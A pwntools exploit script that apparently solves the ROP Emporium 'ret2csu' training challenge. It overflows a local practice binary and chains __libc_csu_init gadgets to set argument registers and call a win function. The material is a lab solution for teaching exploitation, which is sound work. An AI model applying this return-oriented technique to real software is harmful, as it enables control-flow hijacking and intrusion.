#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('ret2csu')
context.log_level = 'debug'
context.terminal = ('tmux', 'new-window')

# find offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
rdi = 0xdeadbeefdeadbeef
rsi = 0xcafebabecafebabe
rdx = 0xd00df00dd00df00d
_fini = next(elf.search(elf.symbols._fini.to_bytes(8, byteorder='little')))
payload = flat(
    { offset : 0x000000000040069a }, # popper gadget
    0,                  # rbx
    1,                  # rbp
    _fini,  # r12
    rdi,                # r13(d) -> edi
    rsi,                # r14 -> rdi
    rdx,                # r15 -> rdx

    0x0000000000400680, # caller gadget
    0,                  # garbage (add rsp, 0x8)
    0,                  # rbx
    0,                  # rbp
    0,                  # r12
    0,                  # r13(d)
    0,                  # r14
    0,                  # r15

    0x00000000004006a3, # pop rdi; ret;
    rdi,                # rdi

    elf.symbols.ret2win # target function
)

# send payload
io = process(elf.path)
io.recvuntil(b'> ')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
print(io.recvline().decode('utf-8'))
